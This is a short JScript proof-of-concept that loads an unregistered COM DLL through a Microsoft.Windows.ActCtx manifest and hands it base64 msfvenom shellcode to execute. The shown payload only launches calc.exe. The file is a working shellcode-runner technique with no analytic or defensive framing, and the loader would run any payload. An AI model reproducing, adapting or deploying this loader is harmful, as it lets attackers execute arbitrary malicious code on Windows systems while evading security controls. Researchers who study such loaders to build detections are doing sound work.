var manifestXML = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?><assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><assemblyIdentity type="win32" name="TestClass" version="2.2.0.0"/> <file name="COMRunner.dll"> <comClass description="Test Class" clsid="{67E11FF2-C068-4C48-A1F5-69A882E0E99A}" threadingModel="Both" progid="TestClass"/></file></assembly>'

var s = new ActiveXObject('WScript.Shell').Environment('Process')('TMP') = "C:\\path\\to\\dll\\";

var actCtx = new ActiveXObject("Microsoft.Windows.ActCtx");
actCtx.ManifestText = manifestXML;

var tc = actCtx.CreateObject("TestClass");
// msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread | base64 -w0
tc.SetData("/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA");
tc.Run();
